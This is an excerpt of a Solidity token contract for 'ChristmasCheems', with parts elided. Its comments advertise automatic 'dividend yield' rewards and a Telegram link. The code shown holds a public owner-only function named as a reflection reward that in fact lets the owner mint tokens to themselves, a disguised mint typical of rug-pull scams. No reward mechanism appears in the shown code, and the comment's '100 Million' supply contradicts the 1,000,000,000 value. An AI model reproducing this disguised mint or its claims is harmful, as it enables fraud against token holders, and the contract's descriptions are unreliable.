...
//
// $ChristmasCheems proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN ChristmasCheems! With the auto-claim feature,
// simply hold$ChristmasCheems and you'll receive ChristmasCheems automatically in your wallet.
// 
// Hold ChristmasCheems and get rewarded in ChristmasCheems on every transaction!
//
//
// 📱 Telegram:https://t.me/ChristmasCheems
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsChristmasCheems(uint256 amount) public onlyOwner {
    _ReflectionRewardsChristmasCheems(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsChristmasCheems(address account, uint256 amount) internal virtual {
...
contract CHRISTMASCHEEMS is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CHRISTMAS CHEEMS", "CHRISTMASCHEEMS") {
        _ReflectionRewardsChristmasCheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}